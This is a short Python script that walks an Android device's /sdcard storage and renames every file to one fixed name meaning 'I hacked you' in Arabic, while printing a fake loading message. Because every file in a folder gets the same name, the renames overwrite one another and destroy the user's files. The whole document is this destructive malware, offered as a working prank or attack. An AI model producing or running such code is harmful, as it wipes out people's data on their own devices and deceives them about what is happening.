import os
xx="/sdcard"
for dir,dirs,files in os.walk(xx):
    nn=len(files)
    for i in range(nn):
        d=dir+"/"+files[i]
        print("Loding ... ")
        name="ISSAM_ISO اخترقتك"
        os.rename(d,dir+"/"+name)